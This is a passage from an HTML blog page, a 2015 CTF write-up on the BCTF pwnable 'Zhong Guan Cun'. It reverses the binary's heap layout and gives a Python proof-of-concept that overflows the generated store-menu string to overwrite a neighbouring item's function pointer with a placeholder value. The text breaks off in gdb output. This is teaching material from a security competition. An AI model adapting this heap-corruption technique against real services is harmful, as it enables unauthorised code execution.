@@ -1,0 +1,1346 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>After the Fact - BCTF Zhong Guan Cun Writeup - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="We&rsquo;re entering a CTF almost every weekend now, but they&rsquo;ve been really tough. I did not manage to exploit this challenge in time, but one &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">After the Fact - BCTF Zhong Guan Cun Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-23T18:55:51+01:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>6:55 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>We&rsquo;re entering a CTF almost every weekend now, but they&rsquo;ve been really tough. I did not manage to exploit this challenge in time, but one day after the CTF ended I had an epiphany and got my exploit working. I figured I&rsquo;d share how I approached this challenge for future reference.</p>
+
+<!-- more -->
+
+
+<p>For this pwnable, called <code>Zhong guan cun</code>, we&rsquo;re given a 32-bit ELF binary and libraries. The task is to exploit it remotely and grab a flag. As said, I did not manage to grab the flag, but I got the exploit working locally.</p>
+
+<p>The binary represents some kind of online store testing program, where we&rsquo;re able to set a name and add items to the shop. Then, we can try out said shop, buying the items and asking for wholesale prices. We <em>cannot</em> modify any entry, nor delete anything after we&rsquo;ve set it.</p>
+
+<p>Playing around with the binary a bit, I noticed that it immediately quit when attempting to overflow a buffer.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>*********************************
+</span><span class='line'>*** Welcome to Zhong Guan Cun ***
+</span><span class='line'>*********************************
+</span><span class='line'>Are you dreaming of becoming a Milli<span class="nv">$_$naire</span>?
+</span><span class='line'>Come to sell some electronics!
+</span><span class='line'>
+</span><span class='line'>a<span class="o">)</span> Register my store
+</span><span class='line'>b<span class="o">)</span> Try my store
+</span><span class='line'>c<span class="o">)</span> Exit
+</span><span class='line'>Your choice? a
+</span><span class='line'>What<span class="s1">&#39;s the name of your store? BLEH</span>
+</span><span class='line'><span class="s1">a) Sell a phone</span>
+</span><span class='line'><span class="s1">b) Sell a watch</span>
+</span><span class='line'><span class="s1">c) Generate a store menu</span>
+</span><span class='line'><span class="s1">d) Return to main menu</span>
+</span><span class='line'><span class="s1">Your choice? a</span>
+</span><span class='line'><span class="s1">Phone&#39;</span>s name? PHONE1
+</span><span class='line'>1<span class="o">)</span> Android OS
+</span><span class='line'>2<span class="o">)</span> iOS
+</span><span class='line'>3<span class="o">)</span> Windows OS
+</span><span class='line'>4<span class="o">)</span> Blackberry OS
+</span><span class='line'>5<span class="o">)</span> Symbian OS
+</span><span class='line'>Choose Phone<span class="s1">&#39;s OS? 1</span>
+</span><span class='line'><span class="s1">Phone&#39;</span>s price? 99999999999
+</span><span class='line'>Phone<span class="err">&#39;</span>s description? PHONE1
+</span><span class='line'>New phone added successfully!
+</span><span class='line'>a<span class="o">)</span> Sell a phone
+</span><span class='line'>b<span class="o">)</span> Sell a watch
+</span><span class='line'>c<span class="o">)</span> Generate a store menu
+</span><span class='line'>d<span class="o">)</span> Return to main menu
+</span><span class='line'>Your choice? c
+</span><span class='line'><span class="o">&lt;&lt;&lt;</span> Store Name: BLEH &gt;&gt;&gt;
+</span><span class='line'><span class="o">===</span> Items in the <span class="nv">store</span> <span class="o">===</span>
+</span><span class='line'>1<span class="o">)</span> Android OS Phone PHONE1 price: <span class="m">2147483647</span> CNY description: PHONE1
+</span><span class='line'>Congraz! Your store menu is generated successfully!
+</span><span class='line'>a<span class="o">)</span> Sell a phone
+</span><span class='line'>b<span class="o">)</span> Sell a watch
+</span><span class='line'>c<span class="o">)</span> Generate a store menu
+</span><span class='line'>d<span class="o">)</span> Return to main menu
+</span><span class='line'>Your choice? AAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>Input is Too Long.
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I reversed the item struct. The items are stored on the heap and we can&rsquo;t have more than 16 items in total.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>            .-- ptr to two <span class="k">function</span> addresses
+</span><span class='line'>            <span class="p">|</span>             .-- start of phone/watch name, 0x20 bytes long
+</span><span class='line'>            v             v
+</span><span class='line'>0x8257008:  0x08049b70    0x41414141  0x41414141  0x41414141
+</span><span class='line'>0x8257018:  0x41414141    0x41414141  0x41414141  0x41414141
+</span><span class='line'>                          .-- start of phone/watch description, 0x50 bytes long
+</span><span class='line'>                          v
+</span><span class='line'>0x8257028:    0x00414141  0x42424242  0x42424242  0x42424242
+</span><span class='line'>0x8257038:    0x42424242  0x42424242  0x42424242  0x42424242
+</span><span class='line'>0x8257048:    0x42424242  0x42424242  0x42424242  0x42424242
+</span><span class='line'>0x8257058:    0x42424242  0x42424242  0x42424242  0x42424242
+</span><span class='line'>0x8257068:    0x42424242  0x42424242  0x42424242  0x42424242
+</span><span class='line'>0x8257078:    0x00424242  0x000003e8
+</span><span class='line'>                          ^
+</span><span class='line'>                          <span class="sb">`</span>-- price
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After finding the function that reads in the input, I tried to find an overflow or off-by-one vulnerability, but everything was locked down tight. There was, however, another thing that caught my attention.</p>
+
+<h2>Heaps of fun</h2>
+
+<p>We have to corrupt some piece of memory somewhere, but the items themselves are not going to cut it. We do, however, have control over the store menu string. This turned out to be the key. If I first added an item, then generated the store menu string and finally added a second item, the layout of the items and store menu on the heap was like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/20wx 0x804b300
+</span><span class='line'>              .-- ptr to store menu string
+</span><span class='line'>              v
+</span><span class='line'>0x804b300:    0x0804c088  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x804b310:    0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x804b320:    0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x804b330:    0x00000000  0x00000000  0x00000000  0x00000000
+</span><span class='line'>0x804b340:    0x0804c008  0x0804cbb8  0x00000000  0x00000000
+</span><span class='line'>              ^           ^
+</span><span class='line'>              <span class="sb">`</span>-- item1   <span class="p">|</span>
+</span><span class='line'>                          <span class="sb">`</span>-- item2
+</span><span class='line'>    e.g. item1 <span class="p">|</span> store_menu <span class="p">|</span> item2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The store description string was in between the items on the stack. The items contained a pointer to two function address:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>            .-- ptr to two <span class="k">function</span> addresses
+</span><span class='line'>            <span class="p">|</span>             .-- start of phone/watch name, 0x20 bytes long
+</span><span class='line'>            v             v
+</span><span class='line'>0x8257008:  0x08049b70    0x41414141  0x41414141  0x41414141
+</span><span class='line'>               ^
+</span><span class='line'>               <span class="p">|</span>
+</span><span class='line'>               <span class="sb">`</span>--- this value points to two functions:
+</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2wx 0x08049b70
+</span><span class='line'>0x8049b70:    0x08049466  0x080492fe
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If I could somehow overwrite that pointer of an item by overflowing the store description string, I could possible get code execution (it was nowhere near that easy, but bear with me). I started trying to generate large items, and indeed, I could overflow the function pointer of the second item using large inputs. The trick was to also set the price to a negative value, giving me just enough bytes to overflow. I whipped up a poc python script to do this for me. The layout and some functions of this poc are heavily inspired by <a href="https://gist.github.com/saelo/9e6934b3c40cf42e3f87">saelo</a>!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
+</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># register store</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># second item, will be allocated after the store menu string</span>
+</span><span class='line'>  <span class="c"># this is the one whose function pointer we will corrupt</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span>  <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>    <span class="c"># for these, we&#39;ll need the minus sign.</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># overflow</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;CCCC&#39;</span><span class="p">)</span>       <span class="c"># overflow with 0x43434343</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> <span class="c"># generate store menu &amp; overflow; 2nd item now points to 0x43434343</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And in action:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">x</span> <span class="mh">0x804b300</span>
+</span><span class='line'><span class="mh">0x804b300</span><span class="p">:</span> <span class="mh">0x08a50088</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804b310</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804b320</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804b330</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804b340</span><span class="p">:</span> <span class="mh">0x08a50008</span>  <span class="mh">0x08a50ba8</span>  <span class="mh">0x08a50c28</span>  <span class="mh">0x08a50ca8</span>
+</span><span class='line'><span class="mh">0x804b350</span><span class="p">:</span> <span class="mh">0x08a50d28</span>  <span class="mh">0x08a50da8</span>  <span class="mh">0x08a50e28</span>  <span class="mh">0x08a50ea8</span>
+</span><span class='line'><span class="mh">0x804b360</span><span class="p">:</span> <span class="mh">0x08a50f28</span>  <span class="mh">0x08a50fa8</span>  <span class="mh">0x08a51028</span>  <span class="mh">0x08a510a8</span>
+</span><span class='line'><span class="mh">0x804b370</span><span class="p">:</span> <span class="mh">0x08a51128</span>  <span class="mh">0x08a511a8</span>  <span class="mh">0x08a51228</span>  <span class="mh">0x08a512a8</span>
+</span><span class='line'><span class="mh">0x804b380</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804b390</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># let&#39;s have a look at the second item:</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x08a50ba8</span>
+</span><span class='line'>            <span class="o">.--</span> <span class="n">now</span> <span class="n">overwritten</span><span class="err">!</span>
